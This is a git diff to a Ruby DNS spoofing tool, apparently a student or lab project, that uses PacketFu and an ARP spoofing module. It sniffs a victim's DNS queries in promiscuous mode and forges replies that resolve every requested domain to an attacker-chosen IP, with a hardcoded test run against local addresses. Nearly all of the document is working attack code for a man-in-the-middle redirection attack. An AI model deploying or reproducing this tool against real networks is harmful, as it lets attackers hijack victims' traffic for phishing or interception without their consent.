@@ -13,6 +13,9 @@ require './arpSpoof.rb'
 # Includes so we don't have to use fully qualified class names
 include PacketFu
 
+=begin
+ 
+=end
 class DnsSpoof
     
     # Initialize the variables and information
@@ -41,7 +44,7 @@ class DnsSpoof
         end
         
         # Get our information
-        # TODO: CHANGE THIS TO ifconfig
+        # TODO: CHANGE THIS TO ifconfig?
         @ourInfo = Utils.whoami?(:iface => interface)
         
         # Enable IP forwarding based on the OS (Linux or OS X)
@@ -72,44 +75,99 @@ private
     def sniffPackets
         
         # Start the capture process
+        filter = "udp and port 53 and src " + @victimIP
+        puts filter
         capture = Capture.new(:iface => @interface, :start => true,
                                         :promisc => true,
-                                        :filter => "udp and port 53",
+                                        :filter => filter,
                                         :save => true)
         
         # Find the DNS packets
         capture.stream.each do |pkt|
-            if Packet.has_data?
+            puts "got packet\n"
+            if UDPPacket.can_parse?(pkt)
+                puts "Can parse\n"
                 packet = Packet.parse(pkt)
-                
+                dnsQuery = packet.payload[2].to_s(base=16) + \
+                           packet.payload[3].to_s(base=16)
                 # Make sure we have a query packet
-                if packet.payload[2] == 1 && packet.payload[3] == 0
-                    domainName = getDomainName(packet)
-                    puts domainName
+                if dnsQuery == '10'
+                    domainName = getDomainName(packet.payload[12..-1])
+                    
+                    if domainName == nil
+                        next
+                    end
+                    
+                    puts "\nDNS request for: " + domainName
+                    
+                    sendResponse(packet, domainName)
                 end
             end
         end
     end
     
-    def sendResponse
+    def sendResponse(packet, domainName)
+        
+        # Convert the IP address
+        tester = "69.171.234.21"
+        myIP = tester.split(".");
+        #myIP = @ourInfo[:ip_saddr].split(".")
+        myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
         
         # Create the UDP packet
-        response = UDPPacket.new(
+        response = UDPPacket.new(:config => @ourInfo)
+        response.udp_src = packet.udp_dst
+        response.udp_dst = packet.udp_src
+        response.ip_saddr = packet.ip_daddr
+        response.ip_daddr = @victimIP
+        response.eth_daddr = @victimMAC
+        
+        # Transaction ID
+        response.payload = packet.payload[0,2]
+        
+        response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
+        
+        # Domain name
+        domainName.split(".").each do |section|
+            response.payload += section.length.chr
+            response.payload += section
+        end
+
+        # Set more default values...........
+        response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
+        response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
+        
+        # IP
+        response.payload += myIP2
+        
+        # Calculate the packet
+        response.recalc
+        
+        # Send the packet out
+        response.to_w(@interface)
+        puts "sent packet out\n"
+        
     end
     
-    def getDomainName(packet)
+    def getDomainName(rawDomain)
         domainName = ""
-        count = 13
-        while count < 100
-            if packet.payload[count].to_s(base = 16).hex.chr == "\003"
-                domainName += "."
-            elsif packet.payload[count].to_s(base = 16).hex.chr == "\000"
-                return domainName
-            else
-                domainName += packet.payload[count].to_s(base = 16).hex.chr
-            end
+        
+        while true
             
-            count += 1
+            # Get the length of the next section of the domain name
+            length = rawDomain[0].to_i
+            
+            if length == 0
+                # We have all the sections, so send it back
+                return domainName = domainName[0, domainName.length - 1]
+            elsif length != 0
+                # Copy the section of the domain name over, kinda like casting :)
+                domainName += rawDomain[1, length] + "."
+                rawDomain = rawDomain[length + 1..-1]
+            else
+                # Malformed packet!
+                return nil
+            end
         end
     end
 
@@ -134,12 +192,19 @@ private
             end
         end
     end
-        
+    
+    # Function for displaying an error message to the screen and then exiting
     def fatalError(message)
         puts message
         exit
     end
 end
 
-spoof = DnsSpoof.new(ARGV[0], ARGV[1], ARGV[2])
-spoof.main
+def test
+    spoof = DnsSpoof.new("192.168.0.1", "192.168.0.180", "en1")
+    spoof.main
+end
+
+test
+#spoof = DnsSpoof.new(ARGV[0], ARGV[1], ARGV[2])
+#spoof.main
